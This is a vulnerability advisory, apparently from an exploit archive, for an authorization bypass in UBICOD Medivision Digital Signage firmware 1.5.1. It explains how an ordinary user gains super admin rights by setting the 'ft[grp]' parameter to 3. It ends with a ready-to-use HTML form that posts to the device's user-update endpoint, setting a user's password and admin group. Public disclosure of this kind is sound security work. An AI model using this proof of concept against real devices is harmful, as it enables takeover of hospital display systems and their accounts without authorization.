@@ -1,0 +1,51 @@
+# Title: UBICOD Medivision Digital Signage 1.5.1 - Authorization Bypass
+# Date: 2020-07-23
+# Author: LiquidWorm
+# Product web page: http://www.medivision.co.kr
+# CVE: N/A
+
+Vendor: UBICOD Co., Ltd. | MEDIVISION INC.
+Product web page: http://www.medivision.co.kr
+Affected version: Firmware 1.5.1 (2013.01.3)
+
+Summary: Medivision is a service that provides everything from DID operation to
+development of DID (Digital Information Display) optimized for hospital environment
+and production of professional contents, through DID product installation, image,
+video content planning, design work, and remote control. This is a one-stop solution
+that solves management at once.
+
+Desc: The application suffers from a privilege escalation vulnerability. Normal user
+can elevate his/her privileges by navigating to /html/user (via IDOR) page sending an
+HTTP GET request setting the parameter 'ft[grp]' to integer value '3' gaining super
+admin rights.
+
+Tested on: Apache/2.4.7 (Ubuntu)
+           PHP/5.5.9-1ubuntu4.22
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5575
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5575.php
+
+
+19.06.2020
+
+--
+
+
+<html>
+  <body>
+    <form action="http://10.0.39.2/query/user/itSet" method="POST">
+      <input type="hidden" name="aa[_id]" value="157" />
+      <input type="hidden" name="aa[pass]" value="123456" />
+      <input type="hidden" name="od[]" value="name" />
+      <input type="hidden" name="ft[grp]" value="3" />
+      <input type="hidden" name="ip" value="0" />
+      <input type="hidden" name="np" value="13" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
